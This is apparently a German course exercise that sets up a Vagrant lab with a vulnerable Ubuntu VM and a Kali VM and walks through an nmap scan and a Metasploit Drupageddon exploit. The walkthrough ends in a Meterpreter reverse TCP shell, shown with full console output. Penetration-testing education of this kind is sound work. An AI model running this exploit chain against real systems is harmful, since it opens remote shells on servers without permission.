# Informationssicherheit: Übung Metasploitable

Laden Sie das Vagrantfile von GitHub herunter und starten Sie die Maschinen.

```console
$ git clone https://github.com/bladewing/infosec-uebungen-metasploit.git
$ cd infosec-uebungen-metasploit
$ vagrant up
```

Die Maschinen werden heruntergeladen und gestartet. Dies kann einige Zeit in Anspruch nehmen.

Die Maschinen erhalten folgende IP-Adressen:

| Maschine | IP            |
| -------- | ------------- |
| ub1404   | 192.168.56.42 |
| eve      | 192.168.56.41 |

In der Maschine ```ub1404``` ist eine ältere Version von Ubuntu installiert, die mehrere Sicherheitslücken aufweist. 
In der Maschine ```eve``` ist Kali Linux installiert, das Metasploit und weitere Werkzeuge enthält.

Führen Sie ```nmap``` auf eve aus, um die offenen Ports zu ermitteln.

```console
[vagrant@eve ~]$ sudo nmap -sV -O 192.168.56.43 -p0-65535
```

Eine Liste der offenen Ports wird angezeigt. Zudem werden die gefundenen Dienste und Betriebssysteme angezeigt.

Starten Sie jetzt Metasploit auf eve.

```console
[vagrant@eve ~]$ msfconsole
```

Suchen Sie nach einem Exploit für die verfügeberen Services.

```console
msf6 > search <service>
```

Wählen Sie einen Exploit aus und konfigurieren Sie ihn.

```console
msf6 > use <exploit>
msf6 exploit(<exploit>) > show options
msf6 exploit(<exploit>) > set RHOSTS <IP>
msf6 exploit(<exploit>) > check
msf6 exploit(<exploit>) > show payloads
msf6 exploit(<exploit>) > set payload <payload>
msf6 exploit(<exploit>) > exploit
```

Experimentieren Sie mit den verschiedenen Optionen und Payloads.

## Beispiel

```console
msf6 > use exploit/multi/http/drupal_drupageddon
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/drupal_drupageddon) > show options

Module options (exploit/multi/http/drupal_drupageddon):

    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
    RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/ using-metasploit.html
    RPORT      80               yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /                yes       The target URI of the Drupal installation
    VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port


Exploit target:

    Id  Name
    --  ----
    0   Drupal 7.0 - 7.31 (form-cache PHP injection method)



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.56.42
RHOSTS => 192.168.56.42
msf6 exploit(multi/http/drupal_drupageddon) > set targeturi /drupal/
targeturi => /drupal/
msf6 exploit(multi/http/drupal_drupageddon) > show payloads

Compatible Payloads
===================

    #   Name                                        Disclosure Date  Rank    Check  Description
    -   ----                                        ---------------  ----    -----  -----------
    0   payload/cmd/unix/bind_aws_instance_connect                   normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
    1   payload/generic/custom                                       normal  No     Custom Payload
    2   payload/generic/shell_bind_aws_ssm                           normal  No     Command Shell, Bind SSM (via AWS API)
    3   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
    4   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
    5   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
    6   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
    7   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
    8   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
    9   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
    10  payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
    11  payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
    12  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
    13  payload/php/exec                                             normal  No     PHP Execute Command
    14  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
    15  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
    16  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
    17  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
    18  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
    19  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
    20  payload/php/meterpreter_reverse_tcp                          normal  No     PHP Meterpreter, Reverse TCP Inline
    21  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
    22  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(multi/http/drupal_drupageddon) > set payload 18
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/http/drupal_drupageddon) > set lhost 192.168.56.41
lhost => 192.168.56.41
msf6 exploit(multi/http/drupal_drupageddon) > run

[*] Started reverse TCP handler on 192.168.56.41:4444 
[*] Sending stage (39927 bytes) to 192.168.56.42
[*] Meterpreter session 3 opened (192.168.56.41:4444 -> 192.168.56.42:60828) at 2024-05-15 23:56:49 +0000

meterpreter > 
```